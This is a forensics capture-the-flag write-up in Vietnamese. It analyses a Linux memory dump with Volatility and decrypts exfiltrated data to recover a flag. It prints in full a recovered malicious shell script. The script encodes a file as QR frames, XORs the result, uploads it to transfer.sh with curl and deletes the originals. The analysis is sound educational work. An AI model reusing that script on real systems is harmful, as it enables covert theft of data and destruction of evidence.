Đề bài tên là `Linux is hurt`, vì thế ta đoán file `mem.bin` đã cho là dump file của Linux.

Mình sử dụng tool `volatility` để phân tích file này, tuy nhiên vol gốc chỉ hỗ trợ cho các file profile Windows thôi, nên ta tiến hành build profile khác vào vol:

> strings mem.bin | grep Version

![Screenshot (3975)](https://github.com/NVex0/uWU/assets/113530029/d3d94a2e-f148-48c8-82a1-b65f8d2538de)

Ta lấy được tên Ubuntu20.04, tiến hành docker trên ubuntu20.04 để lấy được thông tin kernel và các thông tin khác cần thiết. Zip lại thành file `Ubuntu2004.zip`. Ném vào path `/volatility/plugins/overlays/linux`. Check lại profile list của vol:

![image](https://github.com/NVex0/uWU/assets/113530029/614dd4c0-29b8-4747-9e11-389e74fb768c)

Build xong rồi :v, sử dụng profile này và phân tích file đó.

Với Plugins `linux_bash`, ta thấy 1 số thông tin thú vị:

![image](https://github.com/NVex0/uWU/assets/113530029/88746497-6047-4e08-834d-1dc12615c5ea)

Ta thấy user đã tải về 1 file tên `toy.zip`, mở ra và làm 1 số thứ gì đó khả nghi (ta thấy có file enc, tức là user đã tiến hành encrypt gì đó).

Vì thế mình nghĩ tới việc dump file zip này ra để xem, ta sẽ grep để kiếm full path:

![image](https://github.com/NVex0/uWU/assets/113530029/e467885a-440c-4908-8cc1-061d5964ea36)

Sau đó tìm file đó bằng plugin `linux_find_file`:

![image](https://github.com/NVex0/uWU/assets/113530029/31318a24-5179-4364-a241-61ad00a7a7d2)

Oke, đã có Inode của file, dump file zip ra:

> python2 vol.py -f ~/Desktop/mem.bin --profile=LinuxUbuntu2004x64 linux_find_file -i 0xffff9b12ec30cdf8 -O toy.zip

Trên bash history, đoạn command 7z có set password: `maltoy`. Sử dụng pass này để mở zip. Tuy nhiên sau đó mình chỉ lấy được file `deman.sh` :(

Sau khi hỏi Author thì mình có thêm 1 file pcap nữa, mà file này khi extract ra ta sẽ được `toy.zip` đúng, mình mở zip và lấy được cả 2 file như sau:

![image](https://github.com/NVex0/uWU/assets/113530029/f4fa99c2-631f-484a-bb93-f6b701d8b975)

Mở file `demand.sh`:
```
#!/bin/bash
file="$1"
output="$2"
if [ -z "$output" ]; then
    output = "output"
fi
if [ ! -f "$file" ]; then
    exit 1
fi
if [ "$(uname)" == "Darwin" ]; then
    filesize=$(stat -f "%z" "$file")
else
    filesize=$(stat -c%s "$file")
fi
chunksize=64
nchunks=$((filesize/chunksize))
for i in $(seq 0 $nchunks); do
    dd if="$file" of=chunk_"$i" bs="$chunksize" skip="$i" count=1
done
for i in $(seq 0 $nchunks); do
    qrencode -t png -o frame_"$i".png < chunk_"$i" -s 9
done
if [ "$(uname)" == "Darwin" ]; then
    ffmpeg -y -r 10 -i frame_%d.png $output
else
    ffmpeg  -i frame_%d.png $output  -y -r 10
fi
rm -f chunk_*
rm -f frame_*
xortool-xor -f $output -h $(openssl rand -hex 100) > $output.kcs
curl --upload-file ./$output.kcs https://transfer.sh/robots.txt
rm -f $output.kcs
rm -f $output
rm -f $1
```
Vậy là ta hiểu bash `demand.sh` cắt file đầu vào thành nhiều chunk, sau đó encode các chunk đó sang dạng ảnh QR, ghép QR lại thành 1 file GIF, cuối cùng upload nó lên `transfer.sh`.

Sau khi tìm hiểu thì mình biết web transfer.sh này, sau khi upload file lên đó, nó sẽ trả về 1 link dẫn tới file này cho bất kì người nào khác. Tiến hành grep ra:

![image](https://github.com/NVex0/uWU/assets/113530029/ffdfbc3b-c19c-46ca-b5b8-3249a7ee903f)

Um, ta có được link tới file đầu ra này: https://transfer.sh/vXpvqj/robots.txt . Tải nó về thôi :D

Dựa theo bash code, ta sẽ dịch ngược lại data gốc. Mình sẽ tóm tắt các bước dịch ngược lại như này:

1. Xử lí xor. `xortool-xor -f $output -h $(openssl rand -hex 100) > $output.kcs`
2. Cắt `$output` để lấy lại các frame ảnh.
3. QR frame -> data.
4. Ghép data lại.

Ở bước 1, `$output` đã bị Xor với 1 random key 100 bytes. Mình sử dụng `xortool` để bruteforce lại cái key này.

Để ý bash history: `./deman.sh qr.png.enc out.gif`. Ta biết được `$output` là 1 bức ảnh gif, vì thế mình biết được bytes xuất hiện nhiều nhất trong gif là `00` (no data).

Run command sau:

![image](https://github.com/NVex0/uWU/assets/113530029/86996f87-e499-4e1b-83c1-a4a8ef44b1ab)

Ra đúng 1 key :v, xem thử đầu ra nào.

![image](https://github.com/NVex0/uWU/assets/113530029/61f01103-3671-4b07-95ab-e60956b8d596)

File GIF, ngon rồi. Sau đó tách các frame trong gif ra:

> ffmpeg -i 0.gif -r 10 -vsync 0 Frame_%d.png

Vì bước này mình không biết tool nào QR -> data nên mình ném từng ảnh 1 lên tool 😢

Với 7 frame đã có, decode QR và được các data như sau:

`s1VGv0oBj4Wsz+GqR5nYdw==OSxMSZRlAgmv+fLDdm2ZJJeABsi1ZLN20vLYG2EFo+ccZsR/0bljlnC3hRRCLlskMGCd1N5Ci2st7CY9sz65YRWaHWkY1lnspuBzOnRvOGibepJNEYwU/tNstEGC7xh7MElaVRgDyY8PzvKiQ5uCtElFI3I23QSP4KI5AtQReN0d7dvOQ9nqHgtTVr3wSVt6tPhLKQg1INiZDsjwELvYgXcx6QOpOn3GhJB8TzksZ7eksCs9BJ06RTRRPdHtKHAlLDxItgKo2yctR2lkcQMGU0nQDQW/YNx4medptGqR8gjxR0SSC/xHyfFCYigWRIpQSN9ywVrs4RgBIUwqEH0Pr6lbE8URcuvm/9OVcPcRXbokwfNHRNWabPF6pLmgnaETbFwfiBKAcEA6dmLvviSPMg==`

Vậy là ta đã có được data gốc rồi :v.

|
|
Tiếp tới file `evil`, file đó là 1 file `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8203f620bc278dd6a87dfca5cfeebceecc1998bd, for GNU/Linux 2.6.32, stripped`

Khi run thử thì thấy:

![image](https://github.com/NVex0/uWU/assets/113530029/d0f44c2a-a47d-47f0-a988-feebd1879cb9)

Oh, vậy đây là 1 file gốc python, mình dùng `pyintxtractor.py` và `uncompyle6` để lấy được py nguyên bản:

![image](https://github.com/NVex0/uWU/assets/113530029/2f8ddfec-bd3d-4cc7-9c5c-d1928b700d5b)

Dựa vào code, ta biết file `evil` lấy 2 đầu vào để tiến hành encrypt, sau đó write `iv` ghép với `ciphertext`. Từ đó dựa vào data mà mình có ở bước decode QR lấy data trên, ta có được:
+ iv : s1VGv0oBj4Wsz+GqR5nYdw==
+ ciphertext : OSxMSZRlAgmv+fLDdm2ZJJeABsi1ZLN20vLYG2EFo+ccZsR/0bljlnC3hRRCLlskMGCd1N5Ci2st7CY9sz65YRWaHWkY1lnspuBzOnRvOGibepJNEYwU/tNstEGC7xh7MElaVRgDyY8PzvKiQ5uCtElFI3I23QSP4KI5AtQReN0d7dvOQ9nqHgtTVr3wSVt6tPhLKQg1INiZDsjwELvYgXcx6QOpOn3GhJB8TzksZ7eksCs9BJ06RTRRPdHtKHAlLDxItgKo2yctR2lkcQMGU0nQDQW/YNx4medptGqR8gjxR0SSC/xHyfFCYigWRIpQSN9ywVrs4RgBIUwqEH0Pr6lbE8URcuvm/9OVcPcRXbokwfNHRNWabPF6pLmgnaETbFwfiBKAcEA6dmLvviSPMg==

Với key, mình grep:
> strings mem.bin | grep -w ./evil -A 50

Và lấy được thông tin:

![image](https://github.com/NVex0/uWU/assets/113530029/bf489bb2-f3f3-41f5-933e-9101feef2850)
Vậy là có key, key là `5.15.0-kali3`. 

Thông tin cần thiết đã có đủ :v, mình viết script sau để decrypt nó ra:

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
import base64 

data ='OSxMSZRlAgmv+fLDdm2ZJJeABsi1ZLN20vLYG2EFo+ccZsR/0bljlnC3hRRCLlskMGCd1N5Ci2st7CY9sz65YRWaHWkY1lnspuBzOnRvOGibepJNEYwU/tNstEGC7xh7MElaVRgDyY8PzvKiQ5uCtElFI3I23QSP4KI5AtQReN0d7dvOQ9nqHgtTVr3wSVt6tPhLKQg1INiZDsjwELvYgXcx6QOpOn3GhJB8TzksZ7eksCs9BJ06RTRRPdHtKHAlLDxItgKo2yctR2lkcQMGU0nQDQW/YNx4medptGqR8gjxR0SSC/xHyfFCYigWRIpQSN9ywVrs4RgBIUwqEH0Pr6lbE8URcuvm/9OVcPcRXbokwfNHRNWabPF6pLmgnaETbFwfiBKAcEA6dmLvviSPMg=='
data = base64.b64decode(data)

key = '5.15.0-kali3'
key = key.encode('UTF-8')
key = pad(key, AES.block_size)
iv = base64.b64decode('s1VGv0oBj4Wsz+GqR5nYdw==')
cipher = AES.new(key, AES.MODE_CFB, iv)
plaintext = cipher.decrypt(data)
plaintext = unpad(plaintext, AES.block_size)


#Vì là decrypt từ qr.png.enc mà, nên out file là qr.png.
f = open('qr.png','wb')
f.write(plaintext)
f.close()
```

Ngon liền :v
![image](https://github.com/NVex0/uWU/assets/113530029/e8b4814e-2f54-4101-acde-e9f772efd5c0)

Decode ra và ta được flag:

Flag : `KCSC{K1_n13m_L1nuX}`
